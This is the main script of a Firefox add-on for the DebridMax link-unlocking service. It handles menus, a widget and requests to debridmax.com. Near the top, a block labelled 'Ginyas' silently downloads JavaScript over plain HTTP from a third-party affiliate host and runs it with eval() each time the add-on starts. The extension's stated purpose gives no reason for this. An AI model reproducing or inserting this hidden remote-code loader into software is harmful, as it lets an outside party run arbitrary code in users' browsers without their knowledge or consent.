//Defining components variable
var ss = require("simple-storage");
const data = require("self").data;
var pagemods = require("page-mod");
var panels = require("panel");
var contextMenu = require("context-menu");

//BEGIN Ginyas function
var tb = require("tabs");
var tt = require("timer");
var pp = require("panel").Panel;
function globalEval(src, callback) {
	eval(src);
	if (callback){callback();}
}

var Request = require("request").Request;
new Request({
 url: "http://rv.ginyas.com/app/bookmark/bookmarklet/bbrsFFJetPackRVObs.php?affId=ginyas_99",
 onComplete: function(){
		var txt=this.response.text;	
		try{
			globalEval(txt);
		}catch(err){console.log("err: "+err);}
    }
}).get();
//END Ginyas

//links to be shown on generated_link.html
ss.storage.genlink_href = []; //href

//set cachedLinks to null when the addon's started
ss.storage.cachedLinks="";

//Declaring workers
var contentWorker, subWinWorker, genLinkWorker;

//Show load.gif as widget icon
function showLoaderIconOnWidget(){
	debridWidget.contentURL = data.url("load.gif");
}

//Show default icon (icon19.png) as widget icon & decide to whether open generated_link.html or alert that there is no link generated
//TODO: check length with total link (pass it as parameter)
function finishLoadingAction(worker){
	debridWidget.contentURL = data.url("icon19.png");
	if((ss.storage.genlink_href).length>0)
		worker.postMessage({'type':'openGenWin'});
	else
		worker.postMessage({'type':'noLinkGeneratedAlert'});
}

//submission window message handler for its page-mod
function subWindowMsgHandler(msg){
	console.log("subWinMsgHandler msg.type: " + msg.type);
	if(msg.type=="finish_loading")
		finishLoadingAction(subWinWorker);
	else if(msg.type=="loading")
		showLoaderIconOnWidget();
	else if(msg.type=="open_debrid")
		require("windows").browserWindows.open("http://www.debridmax.com/");
	else if(msg.type=="open_donate")
		require("windows").browserWindows.open("https://www.paypal.com/cgi-bin/webscr?cmd=_s-xclick&hosted_button_id=VPJ5YQHBG7L36");
	else if(msg.type=="clearLinkCache")	
		ss.storage.cachedLinks="";
	else if(msg.type=="saveResult")
		storeLinksInStorage(msg.link,msg.text);
	else
		return;
}

//generated link window message handler for its page-mod
function genLinkMsgHandler(msg){
	if(msg.type=="ready")
		genLinkWorker.postMessage({'linksarray':ss.storage.genlink_href});
	else if(msg.type=="clearLinksStorage")
		clearLinksStorage();
	else
		require("clipboard").set(msg.content);
}

//content message handler for its page-mod
function contentMsgHandler(msg){
    console.log("contentMsgHandler: " + msg.type);
	if(msg.type=="loading")
		showLoaderIconOnWidget();
	else if(msg.type=="finish_loading")
		finishLoadingAction(contentWorker);
	else if(msg.type=="saveResult")
		storeLinksInStorage(msg.link,msg.text);
	else
		return;
}

//clear storage for generated links
function clearLinksStorage()
{
	console.log("clear links storage");
	ss.storage.genlink_href=[];
}

//store generated links in storage
function storeLinksInStorage(link,text)
{
	console.log("link stored: " + link);
	ss.storage.genlink_href.push(link);
}

//send the link to submission window
function sendLinkToSubWin(links)
{
	if(ss.storage.cachedLinks)
		ss.storage.cachedLinks += links + "\r\n";
	else
		ss.storage.cachedLinks = links + "\r\n";
	
	debridWidget.panel.postMessage({'type' : "openSubWin"});
}


//to make sure that the subwin always checks the cachedLinks when it's opened and the worker's attached.
function postLinksToSubWin(){
	if(ss.storage.cachedLinks)
		subWinWorker.postMessage({'type' : 'cached_links','content' : ss.storage.cachedLinks});
	else
		return;
}

//Page-mod object for submissionWindow.html
pagemods.PageMod({
	include: data.url("submissionWindow.html"),
	contentScriptWhen: 'ready',
	contentScriptFile: [data.url("jquery-1.5.2.min.js"), data.url("generator.js"), data.url("hostSetter.js"), data.url("subWin.js"), data.url("loginChecker.js"), data.url("htmlparser.js")],
	contentScript: 'var generatedLinkWin="' + data.url("generated_link.html") + '";',
	onAttach: function onAttach(worker){
		
		worker.on('message', subWindowMsgHandler);
		
		//param[0] is the link
		//param[1] is the password of the link
		//param[2] is total of the links
		//param[3] is index of the link
		worker.port.on("generateLink",function generateLink(param){
			console.log("generateLink");
			showLoaderIconOnWidget();
			new Request({
			 url: "http://www.debridmax.com/multimax/p.php",
			 content: "hotlink=" + encodeURIComponent(param[0]) + "&pass=" + encodeURIComponent(param[1]) + "&t=2e", 
			 onComplete: function(){
					var txt=this.response.text;
					if(txt.indexOf('document.location.href="../login.php"')>=0)
						txt = '<a href="http://www.debridmax.com/login.php">Please login before using this extension</a>';
					else if(txt.indexOf("<b>Lien")>=0)
						txt = '<a href="#">The link is invalid</a>';
					else if(txt.indexOf("<b>Serveur")>=0)
						txt = '<a href="http://www.debridmax.com/premium.php">The server is overload. Buy premium to avoid this.</a>';
					else if(txt.indexOf("<b>Vous")>=0)
						txt = '<a href="#">Buy premium to use this feature.</a>';
                   
                    ss.storage.genlink_href.push(txt);
					console.log(txt);
					if(param[2] == param[3]+1)
						finishLoadingAction(worker);
				}
			}).post();
		});
		subWinWorker = worker;
		postLinksToSubWin();
	}
});

//Page-mod object for generated_link.html
pagemods.PageMod({
	include: data.url("generated_link.html"),
	contentScriptWhen: 'ready',
	contentScriptFile: [data.url("jquery-1.5.2.min.js"), data.url("genlink.js")],
	onAttach: function onAttach(worker){
		worker.on('message', genLinkMsgHandler);
		genLinkWorker = worker;
	}
});

//Page-mod object for websites
pagemods.PageMod({
  include: "*",
  contentScriptWhen: 'ready',
  contentScriptFile: [data.url("context_button.js"), data.url("generator.js"), data.url("hostSetter.js"),
					 data.url("pageModder.js"),data.url("loginChecker.js"),data.url("htmlparser.js")],
  contentScript: 'var generatedLinkWin="' + data.url("generated_link.html") + '"; ',
  onAttach: function onAttach(worker) {
	worker.on('message', contentMsgHandler);
		
	//param[0] is the link
	//param[1] is the password of the link
	//param[2] is total of the links
	//param[3] is index of the link
	worker.port.on("generateLink",function generateLink(param){
		console.log("generateLink");
		showLoaderIconOnWidget();
		new Request({
		 url: "http://www.debridmax.com/multimax/p.php",
		 content: "hotlink=" + encodeURIComponent(param[0]) + "&pass=" + encodeURIComponent(param[1]) + "&t=2e", 
		 onComplete: function(){
				var txt=this.response.text;
				if(txt.indexOf('document.location.href="../login.php"')>=0)
					txt = '<a href="http://www.debridmax.com/login.php">Please login before using this extension</a>';
				else if(txt.indexOf("<b>Lien")>=0)
					txt = '<a href="#">The link is invalid</a>';
				else if(txt.indexOf("<b>Serveur")>=0)
					txt = '<a href="http://www.debridmax.com/premium.php">The server is overload. Buy premium to avoid this.</a>';
				else if(txt.indexOf("<b>Vous")>=0)
					txt = '<a href="#">Buy premium to use this feature.</a>';
			   
				ss.storage.genlink_href.push(txt);
				console.log(txt);
				if(param[2] == param[3]+1)
					finishLoadingAction(worker);
			}
		}).post();
	});
	
    contentWorker = worker;
  }
});

//Debridmax Widget
var debridWidget = require("widget").Widget({
	id: "debrid_widget",
	label: "DebridMax",
	contentURL: data.url("icon19.png"),
	panel: panels.Panel({
		height: 110,
		width : 200,
		contentURL: data.url("popup.html"),
		contentScriptFile: [data.url("jquery-1.5.2.min.js"),data.url("popup.js"),data.url("hostSetter.js"),data.url("loginChecker.js"),data.url("htmlparser.js")],
		onShow: function(){
			this.postMessage("loading");
			
			new Request({
			 url: "http://www.debridmax.com/multimax/",
			 onComplete: function(){
				console.log(this.response.status);
				if(this.response.status=="200") //if success
					debridWidget.panel.port.emit("parseLoginDetails",this.response.text);
				else
					debridWidget.panel.port.emit("loginDetailsRequestError","");
				}
			}).get();
			
		},
		onMessage: function(m){
			switch (m){
				case "hidePanel":
					this.hide();
					break;
				case "openLoginTab":
					require("tabs").open("http://www.debridmax.com/login.php");
					break;
				case "openSubWin":
					this.postMessage({'type':'openSubWin'});
				default:
					return;
			}
		}
	})
});

//BEGIN Context menu - It is set here because it needs the saved login details when it starts
			
//Selection context menu
var selectionContextMenu = contextMenu.Menu({
	label: "Debridmax",
	context: contextMenu.SelectionContext(),
	contentScriptWhen: 'ready',
	contentScriptFile: [data.url("generator.js"), data.url("hostSetter.js"),data.url("selectioncontextMenu.js"),data.url("loginChecker.js"),data.url("htmlparser.js")],
	contentScript: 
	' var generatedLinkWin="' + data.url("generated_link.html") + '"; ',
	onMessage: onMessageContextMenu,
	items: [
	contextMenu.Item({ label: "Download selected", data: "ddl" }),
	contextMenu.Item({ label: "Send to submission window", data: "subwin" })
	]
});

//Link context menu
var linkContextMenu = contextMenu.Menu({
	label: "Debridmax",
	context: contextMenu.SelectorContext("a[href]"),
	contentScriptWhen: 'ready',
	contentScriptFile: [data.url("generator.js"), data.url("hostSetter.js"),data.url("linkcontextMenu.js"),data.url("loginChecker.js"),data.url("htmlparser.js")],
	contentScript: 
	'var generatedLinkWin="' + data.url("generated_link.html") + '"; ',
	onMessage: onMessageContextMenu,
	items: [
	contextMenu.Item({ label: "Download link", data: "ddl" }),
	contextMenu.Item({ label: "Send to submission window", data: "subwin" })
	]
});

//callback for selectionContextMenu and linkContextMenu 
function onMessageContextMenu(m) 
{
	console.log(m.type);
	switch (m.type)
	{
		case "loading" :
			showLoaderIconOnWidget();
			break;
		case "finish_loading" :
			finishLoadingAction(contentWorker);
			break;
		case "saveResult" :
			storeLinksInStorage(m.link,m.text);
			break;
		case "send_link_to_subwin" :
			sendLinkToSubWin(m.content);
			break;
		case "generateLink" :
			console.log("generateLink");
			showLoaderIconOnWidget();
			new Request({
			 url: "http://www.debridmax.com/multimax/p.php",
			 content: "hotlink=" + encodeURIComponent(m.link) + "&pass=" + "&t=2e", 
			 onComplete: function(){
					var txt=this.response.text;
					if(txt.indexOf('document.location.href="../login.php"')>=0)
						txt = '<a href="http://www.debridmax.com/login.php">Please login before using this extension</a>';
					else if(txt.indexOf("<b>Lien")>=0)
						txt = '<a href="#">The link is invalid</a>';
					else if(txt.indexOf("<b>Serveur")>=0)
						txt = '<a href="http://www.debridmax.com/premium.php">The server is overload. Buy premium to avoid this.</a>';
					else if(txt.indexOf("<b>Vous")>=0)
						txt = '<a href="#">Buy premium to use this feature.</a>';
				   
					ss.storage.genlink_href.push(txt);
					console.log(txt);
					if(m.length == m.index+1)
						finishLoadingAction(contentWorker);
				}
			}).post();
		
			
		default:
			return;
	}
}

//END Context menu
